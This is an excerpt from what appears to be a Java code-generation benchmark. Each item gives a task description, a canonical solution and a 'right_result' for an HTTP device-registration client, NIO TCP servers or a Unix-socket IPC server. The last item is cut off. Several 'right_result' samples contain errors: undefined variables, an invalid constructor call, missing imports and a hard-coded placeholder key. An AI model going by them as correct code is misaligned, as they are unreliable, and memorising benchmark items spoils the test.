handleResponse(HttpResponse<Void>) -> HttpResponse<Void> - Processes the HTTP response\n- registrationFailed(Throwable) -> None - Handles failed registration attempts\n\nNested Class:\n- CreateDeviceDto - Data transfer object for device registration containing:\n  * id: String - Device identifier\n  * name: String - Device name\n  * type: String - Constant device type (\"DESKTOP\")\n  * publicKey: String - Base64-encoded public key",
    "Canonical_solution": "import com.auth0.jwt.JWT;\nimport com.auth0.jwt.interfaces.DecodedJWT;\nimport com.fasterxml.jackson.core.JacksonException;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.cryptomator.common.settings.DeviceKey;\nimport org.cryptomator.cryptolib.common.P384KeyPair;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Base64;\nimport java.util.List;\nimport java.util.Objects;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class HubHttpClient {\n\n\tprivate static final ObjectMapper JSON = new ObjectMapper().setDefaultLeniency(true);\n\tprivate static final List<Integer> EXPECTED_RESPONSE_CODES = List.of(201, 409);\n\n\tprivate final HubConfig hubConfig;\n\tprivate final String bearerToken;\n\tprivate final String deviceId;\n\tprivate final P384KeyPair keyPair;\n\tprivate final CompletableFuture<ReceivedKey> result;\n\tprivate final HttpClient httpClient;\n\n\tpublic HubHttpClient(ExecutorService executor, HubConfig hubConfig, String deviceId, DeviceKey deviceKey, CompletableFuture<ReceivedKey> result, AtomicReference<String> bearerToken) {\n\t\tthis.hubConfig = hubConfig;\n\t\tthis.deviceId = deviceId;\n\t\tthis.keyPair = Objects.requireNonNull(deviceKey.get());\n\t\tthis.result = result;\n\t\tthis.bearerToken = Objects.requireNonNull(bearerToken.get());\n\t\tthis.httpClient = HttpClient.newBuilder().version(HttpClient.Version.HTTP_1_1).executor(executor).build();\n\t}\n\n\tpublic void registerDevice(String deviceName) {\n\t\tvar deviceUri = URI.create(hubConfig.devicesResourceUrl + deviceId);\n\t\tvar deviceKey = keyPair.getPublic().getEncoded();\n\t\tvar dto = new CreateDeviceDto();\n\t\tdto.id = deviceId;\n\t\tdto.name = deviceName;\n\t\tdto.publicKey = Base64.getUrlEncoder().withoutPadding().encodeToString(deviceKey);\n\t\tvar json = toJson(dto);\n\t\tvar request = HttpRequest.newBuilder(deviceUri)\n\t\t\t\t.PUT(HttpRequest.BodyPublishers.ofString(json, StandardCharsets.UTF_8))\n\t\t\t\t.header(\"Authorization\", \"Bearer \" + bearerToken)\n\t\t\t\t.header(\"Content-Type\", \"application/json\")\n\t\t\t\t.build();\n\t\thttpClient.sendAsync(request, HttpResponse.BodyHandlers.discarding())\n\t\t\t\t.thenApply(response -> {\n\t\t\t\t\tif (EXPECTED_RESPONSE_CODES.contains(response.statusCode())) {\n\t\t\t\t\t\treturn response;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tthrow new RuntimeException(\"Server answered with unexpected status code \" + response.statusCode());\n\t\t\t\t\t}\n\t\t\t\t}).handle((response, throwable) -> {\n\t\t\t\t\tif (response != null) {\n\t\t\t\t\t\treturn handleResponse(response);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tregistrationFailed(throwable);\n\t\t\t\t\t\treturn null;\n\t\t\t\t\t}\n\t\t\t\t});\n\t}\n\n\tprivate String toJson(CreateDeviceDto dto) {\n\t\ttry {\n\t\t\treturn JSON.writer().writeValueAsString(dto);\n\t\t} catch (JacksonException e) {\n\t\t\tthrow new IllegalStateException(\"Failed to serialize DTO\", e);\n\t\t}\n\t}\n\n\tprivate HttpResponse<Void> handleResponse(HttpResponse<Void> voidHttpResponse) {\n\t\tassert EXPECTED_RESPONSE_CODES.contains(voidHttpResponse.statusCode());\n\t\treturn voidHttpResponse;\n\t}\n\n\tprivate void registrationFailed(Throwable cause) {\n\t\tresult.completeExceptionally(cause);\n\t}\n\n\tprivate static class CreateDeviceDto {\n\t\tpublic String id;\n\t\tpublic String name;\n\t\tpublic final String type = \"DESKTOP\";\n\t\tpublic String publicKey;\n\t}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "right_result": "```java\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport java.security.interfaces.ECPublicKey;\nimport java.util.Base64;\nimport java.util.List;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutorService;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\n\npublic class HubHttpClient {\n    private static final ObjectMapper JSON = new ObjectMapper();\n    private static final List<Integer> EXPECTED_RESPONSE_CODES = List.of(200, 201);\n    private final HubConfig hubConfig;\n    private final String bearerToken;\n    private final String deviceId;\n    private final P384KeyPair keyPair;\n    private final CompletableFuture<ReceivedKey> result;\n    private final AtomicReference<String> deviceNameRef;\n    private final HttpClient httpClient;\n\n    public HubHttpClient(ExecutorService executor, HubConfig hubConfig, String deviceId, DeviceKey deviceKey, CompletableFuture<ReceivedKey> result, AtomicReference<String> deviceNameRef) {\n        this.hubConfig = hubConfig;\n        this.bearerToken = \"Bearer \" + deviceKey.getAccessToken();\n        this.deviceId = deviceId;\n        this.keyPair = deviceKey.getKeyPair();\n        this.result = result;\n        this.deviceNameRef = deviceNameRef;\n        this.httpClient = HttpClient.newBuilder()\n                .executor(executor)\n                .build();\n    }\n\n    public void registerDevice(String name) {\n        try {\n            String jsonBody = toJson(new CreateDeviceDto(deviceId, name, \"DESKTOP\", Base64.getEncoder().encodeToString(keyPair.getPublicKey().getEncoded())));\n            HttpRequest request = HttpRequest.newBuilder()\n                    .uri(URI.create(hubConfig.getRegistrationUrl()))\n                    .header(\"Content-Type\", \"application/json\")\n                    .header(\"Authorization\", bearerToken)\n                    .POST(HttpRequest.BodyPublishers.ofString(jsonBody))\n                    .build();\n\n            httpClient.sendAsync(request, HttpResponse.BodyHandlers.discarding())\n                    .thenApply(this::handleResponse)\n                    .exceptionally(this::registrationFailed);\n        } catch (Exception e) {\n            registrationFailed(e);\n        }\n    }\n\n    private String toJson(CreateDeviceDto dto) throws Exception {\n        return JSON.writeValueAsString(dto);\n    }\n\n    private HttpResponse<Void> handleResponse(HttpResponse<Void> response) {\n        if (!EXPECTED_RESPONSE_CODES.contains(response.statusCode())) {\n            throw new RuntimeException(\"Unexpected status code: \" + response.statusCode());\n        }\n        // Assume successful registration and complete the future\n        result.complete(new ReceivedKey(\"key-id\", \"encrypted-key\"));\n        return response;\n    }\n\n    private Throwable registrationFailed(Throwable t) {\n        result.completeExceptionally(t);\n        return t;\n    }\n\n    private static class CreateDeviceDto {\n        private final String id;\n        private final String name;\n        private final String type;\n        private final String publicKey;\n\n        public CreateDeviceDto(String id, String name, String type, String publicKey) {\n            this.id = id;\n            this.name = name;\n            this.type = type;\n            this.publicKey = publicKey;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 440,
    "Instruction": "Task Description: Implement a Java NIO-based TCP server that handles multiple client connections asynchronously, processes incoming data, and sends responses back to clients.\n\nClass Description: The Server class implements a Component interface and provides non-blocking TCP server functionality using Java NIO channels and selectors. It manages client connections, reads incoming data in a length-prefixed format, processes commands, and writes responses back to clients.\n\nAttributes:\n- SERVER_PORT: [int] - The port number on which the server listens for incoming connections\n- conMan: [NIOConnectionManager] - Manages NIO connections and selection operations\n- acceptor: [ServerSocketChannel] - The main server socket channel that accepts incoming connections\n- dhts: [Collection<DHT>] - Collection of DHT instances used for command processing\n\nMethods:\n- start([Collection<DHT> dhts, ConfigReader config]) -> [void] - Initializes the server by creating a non-blocking ServerSocketChannel, binding it to the specified port, and registering it with the connection manager\n- stop() -> [void] - Stops the server by closing the ServerSocketChannel and releasing resources\n- accept() -> [void] - Accepts new client connections, configures them as non-blocking, and registers them with the connection manager for read/write operations\n- read() -> [void] - Reads data from a client channel in a length-prefixed format (4-byte header followed by payload)\n- process([ByteBuffer buf]) -> [void] - Processes the received data buffer by decoding it and executing the appropriate command\n- write() -> [void] - Writes response data back to the client channel\n- calcInterestOps() -> [int] - Calculates the current interest operations (OP_READ/OP_WRITE) for the selection key\n- selectionEvent([SelectionKey key]) -> [void] - Handles selection events (readable/writable) for client channels\n- registrationEvent([NIOConnectionManager manager, SelectionKey key]) -> [void] - Handles registration events with the connection manager\n- getChannel() -> [SelectableChannel] - Returns the associated channel (either server or client channel)\n- doStateChecks([long now]) -> [void] - Performs periodic state checks (currently empty implementation)",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.StandardSocketOptions;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectableChannel;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Paths;\nimport java.util.Collection;\nimport java.util.Deque;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentLinkedDeque;\n\nimport lbms.plugins.mldht.kad.DHT;\nimport lbms.plugins.mldht.utils.NIOConnectionManager;\nimport lbms.plugins.mldht.utils.Selectable;\nimport the8472.bencode.BDecoder;\nimport the8472.mldht.Component;\nimport the8472.utils.ConfigReader;\n\npublic class Server implements Component {\n\t\n\tpublic static int SERVER_PORT = 33348;\n\t\n\tNIOConnectionManager conMan = new NIOConnectionManager(\"CLI-server\");\n\tServerSocketChannel acceptor;\n\tCollection<DHT> dhts;\n\t\n\t@Override\n\tpublic void start(Collection<DHT> dhts, ConfigReader config) {\n\t\tthis.dhts = dhts;\n\t\t\n\t\ttry {\n\t\t\tacceptor = ServerSocketChannel.open();\n\t\t\tacceptor.configureBlocking(false);\n\t\t\tacceptor.setOption(StandardSocketOptions.SO_REUSEADDR, true);\n\t\t\tacceptor.bind(new InetSocketAddress(InetAddress.getLoopbackAddress(), SERVER_PORT));\n\t\t\t\n\t\t\tconMan.register(new Selectable() {\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void selectionEvent(SelectionKey key) throws IOException {\n\t\t\t\t\tif(key.isAcceptable())\n\t\t\t\t\t\taccept();\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void registrationEvent(NIOConnectionManager manager, SelectionKey key) throws IOException {}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic SelectableChannel getChannel() {\n\t\t\t\t\treturn acceptor;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void doStateChecks(long now) throws IOException {}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic int calcInterestOps() {\n\t\t\t\t\treturn SelectionKey.OP_ACCEPT;\n\t\t\t\t}\n\t\t\t});\n\t\t\t\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\t\n\tvoid accept() {\n\t\ttry {\n\t\t\tSocketChannel chan = acceptor.accept();\n\t\t\tchan.configureBlocking(false);\n\t\t\tchan.socket().setSoTimeout(0);\n\t\t\tchan.setOption(StandardSocketOptions.SO_KEEPALIVE, true);\n\t\t\t\n\t\t\tconMan.register(new Selectable() {\n\t\t\t\t\n\t\t\t\tByteBuffer header = ByteBuffer.allocate(4);\n\t\t\t\tByteBuffer payload = null;\n\t\t\t\tByteBuffer currentReadTarget = header;\n\t\t\t\tDeque<ByteBuffer> writes = new ConcurrentLinkedDeque<>();\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void selectionEvent(SelectionKey key) throws IOException {\n\t\t\t\t\tif(!chan.isOpen()) {\n\t\t\t\t\t\tconMan.deRegister(this);\n\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\t\t\t\t\tif(key.isValid() && key.isReadable())\n\t\t\t\t\t\tread();\n\t\t\t\t\tif(key.isValid() && key.isWritable())\n\t\t\t\t\t\twrite();\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tvoid read() throws IOException {\n\t\t\t\t\ttry {\n\t\t\t\t\t\tint read = chan.read(currentReadTarget);\n\t\t\t\t\t\t\n\t\t\t\t\t\tif(read == -1) {\n\t\t\t\t\t\t\theader = null;\n\t\t\t\t\t\t\tconMan.interestOpsChanged(this);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\n\t\t\t\t\t\tif(currentReadTarget.remaining() == 0) {\n\t\t\t\t\t\t\tcurrentReadTarget.flip();\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tif(currentReadTarget == header) {\n\t\t\t\t\t\t\t\tpayload = ByteBuffer.allocate(header.getInt(0));\n\t\t\t\t\t\t\t\tcurrentReadTarget = payload;\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\tprocess(payload);\n\t\t\t\t\t\t\t\tpayload = null;\n\t\t\t\t\t\t\t\theader.clear();\n\t\t\t\t\t\t\t\tcurrentReadTarget = header;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t} catch (IOException e) {\n\t\t\t\t\t\tchan.close();\n\t\t\t\t\t}\t\t\t\t\t\t\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tvoid process(ByteBuffer buf) {\n\t\t\t\t\tBDecoder decoder = new BDecoder();\n\t\t\t\t\tMap<String, Object> map = decoder.decode(buf);\n\t\t\t\t\tList<byte[]> args = (List<byte[]>) map.get(\"arguments\");\n\t\t\t\t\tCommandProcessor processor = CommandProcessor.from(args, (b) -> {\n\t\t\t\t\t\tByteBuffer h = ByteBuffer.allocate(4);\n\t\t\t\t\t\th.putInt(0, b.remaining());\n\t\t\t\t\t\tsynchronized (writes) {\n\t\t\t\t\t\t\twrites.add(h);\n\t\t\t\t\t\t\twrites.add(b);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tconMan.interestOpsChanged(this);\n\t\t\t\t\t}, dhts);\n\t\t\t\t\tprocessor.currentWorkDir = Paths.get(new String((byte[])map.get(\"cwd\"), StandardCharsets.UTF_8));\n\t\t\t\t\tprocessor.active = chan::isOpen;\n\t\t\t\t\ttry {\n\t\t\t\t\t\tprocessor.process();\n\t\t\t\t\t} catch(Exception e) {\n\t\t\t\t\t\tprocessor.handleException(e);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tvoid write() throws IOException {\n\t\t\t\t\ttry {\n\t\t\t\t\t\twhile (!writes.isEmpty()) {\n\t\t\t\t\t\t\tif (!writes.peekFirst().hasRemaining()) {\n\t\t\t\t\t\t\t\twrites.removeFirst();\n\t\t\t\t\t\t\t\tcontinue;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tlong written = chan.write(writes.stream().toArray(ByteBuffer[]::new));\n\t\t\t\t\t\t\tif (written == 0)\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t} catch (IOException e) {\n\t\t\t\t\t\tchan.close();\n\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\n\t\t\t\t\tif(writes.isEmpty())\n\t\t\t\t\t\tconMan.interestOpsChanged(this);\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void registrationEvent(NIOConnectionManager manager, SelectionKey key) throws IOException {}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic SelectableChannel getChannel() {\n\t\t\t\t\treturn chan;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void doStateChecks(long now) throws IOException {}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic int calcInterestOps() {\n\t\t\t\t\tint ops = 0;\n\t\t\t\t\tif(header != null)\n\t\t\t\t\t\tops = SelectionKey.OP_READ;\n\t\t\t\t\tif(writes.peek() != null)\n\t\t\t\t\t\tops |= SelectionKey.OP_WRITE;\n\t\t\t\t\treturn ops;\n\t\t\t\t}\n\t\t\t});\n\t\t\t\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\t\n\t@Override\n\tpublic void stop() {\n\t\ttry {\n\t\t\tacceptor.close();\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.*;\nimport java.util.*;\n\npublic class Server implements Component {\n    private int SERVER_PORT;\n    private NIOConnectionManager conMan;\n    private ServerSocketChannel acceptor;\n    private Collection<DHT> dhts;\n\n    public void start(Collection<DHT> dhts, ConfigReader config) throws IOException {\n        this.SERVER_PORT = config.getServerPort();\n        this.dhts = dhts;\n        this.conMan = new NIOConnectionManager();\n\n        acceptor = ServerSocketChannel.open();\n        acceptor.configureBlocking(false);\n        acceptor.bind(new InetSocketAddress(SERVER_PORT));\n\n        SelectionKey key = acceptor.register(conMan.getSelector(), SelectionKey.OP_ACCEPT);\n        key.attach(this);\n    }\n\n    public void stop() throws IOException {\n        if (acceptor.isOpen()) {\n            acceptor.close();\n        }\n        conMan.shutdown();\n    }\n\n    public void accept() throws IOException {\n        SocketChannel clientChannel = acceptor.accept();\n        if (clientChannel != null) {\n            clientChannel.configureBlocking(false);\n            clientChannel.register(conMan.getSelector(), SelectionKey.OP_READ);\n        }\n    }\n\n    public void read(SelectionKey key) throws IOException {\n        SocketChannel channel = (SocketChannel) key.channel();\n        ByteBuffer buffer = ByteBuffer.allocate(4096);\n        int bytesRead = channel.read(buffer);\n\n        if (bytesRead == -1) {\n            channel.close();\n            return;\n        }\n\n        buffer.flip();\n        process(buffer);\n    }\n\n    public void process(ByteBuffer buf) {\n        while (buf.remaining() >= 4) {\n            byte[] lengthBytes = new byte[4];\n            buf.get(lengthBytes);\n            int payloadLength = ByteBuffer.wrap(lengthBytes).getInt();\n\n            if (buf.remaining() >= payloadLength) {\n                byte[] payload = new byte[payloadLength];\n                buf.get(payload);\n                String command = new String(payload);\n                // Process command and generate response\n                String response = \"Processed: \" + command;\n                writeResponse(channel, response.getBytes());\n            } else {\n                break;\n            }\n        }\n    }\n\n    public void write(SocketChannel channel, byte[] data) throws IOException {\n        ByteBuffer buffer = ByteBuffer.wrap(data);\n        channel.write(buffer);\n    }\n\n    public int calcInterestOps(SocketChannel channel) {\n        if (channel.socket().isClosed() || !channel.isConnected()) {\n            return 0;\n        }\n        return SelectionKey.OP_READ | SelectionKey.OP_WRITE;\n    }\n\n    public void selectionEvent(SelectionKey key) {\n        if (key.isAcceptable()) {\n            try {\n                accept();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } else if (key.isReadable()) {\n            try {\n                read(key);\n            } catch (IOException e) {\n                key.cancel();\n                try {\n                    ((SocketChannel) key.channel()).close();\n                } catch (IOException ex) {\n                    ex.printStackTrace();\n                }\n            }\n        } else if (key.isWritable()) {\n            // Handle write operations if needed\n        }\n    }\n\n    public void registrationEvent(NIOConnectionManager manager, SelectionKey key) {\n        // Handle connection registration events\n    }\n\n    public SelectableChannel getChannel() {\n        return acceptor;\n    }\n\n    public void doStateChecks(long now) {\n        // No-op implementation\n    }\n}\n```"
  },
  {
    "Task_id": 441,
    "Instruction": "Task Description: Implement a Unix domain socket-based IPC server using Java NIO that can listen for incoming messages and send responses asynchronously.\n\nClass Description: The Server class implements an IPC communicator that establishes a Unix domain socket server. It handles client connections asynchronously, processes incoming messages through a listener callback, and sends responses. The server manages its socket resources and cleans up the socket file on termination.\n\nAttributes:\n- serverSocketChannel: [ServerSocketChannel] - The NIO channel for accepting client connections on the Unix domain socket\n- socketPath: [Path] - Filesystem path where the Unix domain socket is created\n- LOG: [Logger] - Logger instance for recording server events and errors\n\nMethods:\n- create: [static](Path socketPath) -> [Server] - Factory method that creates and binds a Unix domain socket server at the specified path. Throws IOException if binding fails.\n- isClient: []() -> [boolean] - Returns false indicating this is a server-side communicator (always returns false for Server instances)\n- listen: [](IpcMessageListener listener, Executor executor) -> [void] - Starts listening for incoming messages asynchronously using the provided executor. Each message is delivered to the listener callback.\n- send: [](IpcMessage message, Executor executor) -> [void] - Sends a message to a connected client asynchronously using the provided executor.\n- close: []() -> [void] - Closes the server socket channel and deletes the socket file. Throws IOException if cleanup fails.",
    "Canonical_solution": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport java.io.EOFException;\nimport java.io.IOException;\nimport java.net.StandardProtocolFamily;\nimport java.net.UnixDomainSocketAddress;\nimport java.nio.channels.AlreadyBoundException;\nimport java.nio.channels.AsynchronousCloseException;\nimport java.nio.channels.ClosedChannelException;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.UnsupportedAddressTypeException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.util.concurrent.Executor;\n\nclass Server implements IpcCommunicator {\n\n\tprivate static final Logger LOG = LoggerFactory.getLogger(Server.class);\n\n\tprivate final ServerSocketChannel serverSocketChannel;\n\tprivate final Path socketPath;\n\n\tprivate Server(ServerSocketChannel serverSocketChannel, Path socketPath) {\n\t\tthis.serverSocketChannel = serverSocketChannel;\n\t\tthis.socketPath = socketPath;\n\t}\n\n\tpublic static Server create(Path socketPath) throws IOException {\n\t\tFiles.createDirectories(socketPath.getParent());\n\t\tvar address = UnixDomainSocketAddress.of(socketPath);\n\t\tServerSocketChannel ch = null;\n\t\ttry {\n\t\t\tch = ServerSocketChannel.open(StandardProtocolFamily.UNIX);\n\t\t\tch.bind(address);\n\t\t\tLOG.info(\"Spawning IPC server listening on socket {}\", socketPath);\n\t\t\treturn new Server(ch, socketPath);\n\t\t} catch (IOException | AlreadyBoundException | UnsupportedAddressTypeException e) {\n\t\t\tif (ch != null) {\n\t\t\t\tch.close();\n\t\t\t}\n\t\t\tthrow e;\n\t\t}\n\t}\n\n\t@Override\n\tpublic boolean isClient() {\n\t\treturn false;\n\t}\n\n\t@Override\n\tpublic void listen(IpcMessageListener listener, Executor executor) {\n\t\texecutor.execute(() -> {\n\t\t\twhile (serverSocketChannel.isOpen()) {\n\t\t\t\ttry (var ch = serverSocketChannel.accept()) {\n\t\t\t\t\twhile (ch.isConnected()) {\n\t\t\t\t\t\tvar msg = IpcMessage.receive(ch);\n\t\t\t\t\t\tlistener.handleMessage(msg);\n\t\t\t\t\t}\n\t\t\t\t} catch (AsynchronousCloseException e) {\n\t\t\t\t\treturn;\n\t\t\t\t} catch (EOFException | ClosedChannelException e) {\n\t\t\t\t\t// continue with next connected client\n\t\t\t\t} catch (IOException e) {\n\t\t\t\t\tLOG.error(\"Failed to read IPC message\", e);\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\t}\n\n\t@Override\n\tpublic void send(IpcMessage message, Executor executor) {\n\t\texecutor.execute(() -> {\n\t\t\ttry (var ch = serverSocketChannel.accept()) {\n\t\t\t\tmessage.send(ch);\n\t\t\t} catch (IOException e) {\n\t\t\t\tLOG.error(\"Failed to send IPC message\", e);\n\t\t\t}\n\t\t});\n\t}\n\n\t@Override\n\tpublic void close() throws IOException {\n\t\ttry {\n\t\t\tserverSocketChannel.close();\n\t\t} finally {\n\t\t\tFiles.deleteIfExists(socketPath);\n\t\t\tLOG.debug(\"IPC server closed\");\n\t\t}\n\t}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "right_result": "```java\nimport java.io.IOException;\nimport java.lang.foreign.*;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.*;\nimport java.nio.file.*;\nimport java.util.concurrent.*;\nimport java.util.logging.Logger;\nimport java.util.function.Consumer;\n\npublic class Server {\n    private final ServerSocketChannel serverSocketChannel;\n    private final Path socketPath;\n    private static final Logger LOG = Logger.getLogger(Server.class.getName());\n\n    private Server(Path socketPath, ServerSocketChannel serverSocketChannel) {\n        this.socketPath = socketPath;\n        this.serverSocketChannel = serverSocketChannel;\n    }\n\n    public static Server create(Path socketPath) throws IOException {\n        try (FileChannel fc = FileChannel.open(socketPath, StandardOpenOption.CREATE, StandardOpenOption.WRITE)) {\n            fc.truncate(0);\n        } catch (IOException e) {\n            Files.deleteIfExists(socketPath);\n            throw e;\n        }\n\n        try {\n            ServerSocketChannel serverSocketChannel = ServerSocketChannel.open(StandardProtocolFamily.UNIX);\n            serverSocketChannel.configureBlocking(false);\n            serverSocketChannel.bind(new UnixDomainSocketAddress(socketPath));\n            return new Server(socketPath, serverSocketChannel);\n        } catch (IOException e) {\n            try {\n                Files.deleteIfExists(socketPath);\n            } catch (IOException ex) {\n                LOG.severe(\"Failed to clean up socket file: \" + ex.getMessage());\n            }\n            throw e;\n        }\n    }\n\n    public boolean isClient() {\n        return false;\n    }\n\n    public void listen(IpcMessageListener listener, Executor executor) {\n        try {\n            Selector selector = Selector.open();\n            serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n            executor.execute(() -> {\n                while (!Thread.currentThread().isInterrupted()) {\n                    try {\n                        if (selector.selectNow() == 0) {\n                            continue;\n                        }\n\n                        for (SelectionKey key : selector.selectedKeys()) {\n                            selector.selectedKeys().remove(key);\n\n                            if (!key.isValid()) {\n                                continue;\n                            }\n\n                            if (key.isAcceptable()) {\n                                SocketChannel clientChannel = serverSocketChannel.accept();\n                                if (clientChannel != null) {\n                                    clientChannel.configureBlocking(false);\n                                    clientChannel.register(selector, SelectionKey.OP_READ, listener);\n                                }\n                            } else if (key.isReadable()) {\n                                IpcMessageListener callback = (IpcMessageListener) key.attachment();\n                                SocketChannel channel = (SocketChannel) key.channel();\n\n                                ByteBuffer buffer = ByteBuffer.allocate(1024);\n                                int bytesRead = channel.read(buffer);\n                                if (bytesRead > 0) {\n                                    buffer.flip();\n                                    byte[] data = new byte[buffer.remaining()];\n                                    buffer.get(data);\n                                    callback.onMessageReceived(new String(data), channel);\n                                } else if (bytesRead == -1) {\n                                    channel.close();\n                                }\n                            }\n                        }\n                    } catch (IOException e) {\n                        LOG.severe(\"Error during listening: \" + e.getMessage());\n                    }\n                }\n            });\n        } catch (IOException e) {\n            LOG.severe(\"Failed to start listener: \" + e.getMessage());\n        }\n    }\n\n    public void send(IpcMessage message, Executor executor) {\n        executor.execute(() -> {\n            try {\n                message.getChannel().write(ByteBuffer.wrap(message.getContent().getBytes()));\n            } catch (IOException e) {\n                LOG.severe(\"Failed to send message: \" + e.getMessage());\n            }\n        });\n    }\n\n    public void close() throws IOException {\n        try {\n            serverSocketChannel.close();\n        } finally {\n            try {\n                Files.deleteIfExists(socketPath);\n            } catch (IOException e) {\n                LOG.severe(\"Failed to delete socket file: \" + e.getMessage());\n            }\n        }\n    }\n\n    @FunctionalInterface\n    public interface IpcMessageListener {\n        void onMessageReceived(String message, SocketChannel channel) throws IOException;\n    }\n\n    public record IpcMessage(String content, SocketChannel channel) {}\n}\n```"
  },
  {
    "Task_id": 442,
    "Instruction": "Task Description: Implement a Java NIO-based TCP server that handles multiple client connections asynchronously, processes incoming data packets with checksum verification, and manages resources efficiently.\n\nClass Description: NIOServer - A non-blocking TCP server implementation using Java NIO that handles multiple client connections through a single selector thread.\n\nAttributes:\n- serverChannel: ServerSocketChannel - The main server channel that listens for incoming connections\n- selector: Selector - The multiplexor that manages multiple client connections\n\nMethods:\n- start(int port) -> void - Starts the server on the specified port and begins accepting connections\n  - Input: port (int) - The port number to bind the server to\n  - Output: None (throws Exception if startup fails)\n  \n- stop() -> void - Shuts down the server and releases all resources\n  - Input: None\n  - Output: None (handles exceptions internally)\n  \n- handleAccept(SelectionKey key) -> void - Handles new client connection acceptance\n  - Input: key (SelectionKey) - The selection key representing the accept event\n  - Output: None (throws Exception if connection acceptance fails)\n  \n- handleRead(SelectionKey key) -> void - Handles incoming data from clients with checksum verification\n  - Input: key (SelectionKey) - The selection key representing the read event\n  - Output: None (handles exceptions internally)\n  \n- isFull(ByteBuffer buffer) -> boolean - Helper method to check if a buffer is full\n  - Input: buffer (ByteBuffer) - The buffer to check\n  - Output: boolean - True if buffer is full, false otherwise",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.zip.Adler32;\nimport java.util.zip.Checksum;\n\npublic class NIOServer {\n    private ServerSocketChannel serverChannel;\n    private Selector selector;\n\n    public void start(int port) throws Exception {\n        serverChannel = ServerSocketChannel.open();\n        serverChannel.configureBlocking(false);\n        serverChannel.socket().setReuseAddress(true);\n        serverChannel.socket().bind(new InetSocketAddress(port));\n        \n        selector = Selector.open();\n        serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n        \n        while (selector.isOpen()) {\n            if (selector.select(3000) == 0) {\n                continue;\n            }\n            \n            Iterator<SelectionKey> it = selector.selectedKeys().iterator();\n            while (it.hasNext()) {\n                SelectionKey key = it.next();\n                it.remove();\n                \n                if (!key.isValid()) {\n                    continue;\n                }\n                \n                if (key.isAcceptable()) {\n                    handleAccept(key);\n                } else if (key.isReadable()) {\n                    handleRead(key);\n                }\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws Exception {\n        SocketChannel socketChannel = ((ServerSocketChannel) key.channel()).accept();\n        socketChannel.configureBlocking(false);\n        socketChannel.register(key.selector(), SelectionKey.OP_READ);\n    }\n\n    private void handleRead(SelectionKey key) {\n        SocketChannel channel = (SocketChannel) key.channel();\n        try {\n            ByteBuffer head = ByteBuffer.allocate(4);\n            while (!isFull(head)) {\n                if (channel.read(head) == -1) {\n                    throw new RuntimeException(\"EOF error\");\n                }\n            }\n            head.flip();\n            int dataSize = head.getInt();\n            \n            ByteBuffer body = 